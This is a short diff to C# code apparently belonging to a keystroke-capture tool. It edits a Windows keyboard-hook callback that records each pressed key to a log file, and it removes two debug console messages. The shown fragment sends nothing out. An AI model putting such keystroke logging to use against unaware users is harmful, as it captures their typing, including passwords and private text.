@@ -67,7 +67,6 @@ namespace KeyCapture
 
         private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
         {
-            Console.WriteLine("Entered HookCallBack()");
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
             {
                 int vkCode = Marshal.ReadInt32(lParam);
@@ -76,8 +75,7 @@ namespace KeyCapture
                 LogService.WriteToLog(LogService.LogPath, Convert.ToString((Keys)vkCode));
                 
             }
-            Console.WriteLine("Exiting HookCallBack()");
-
+           
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
         }
 
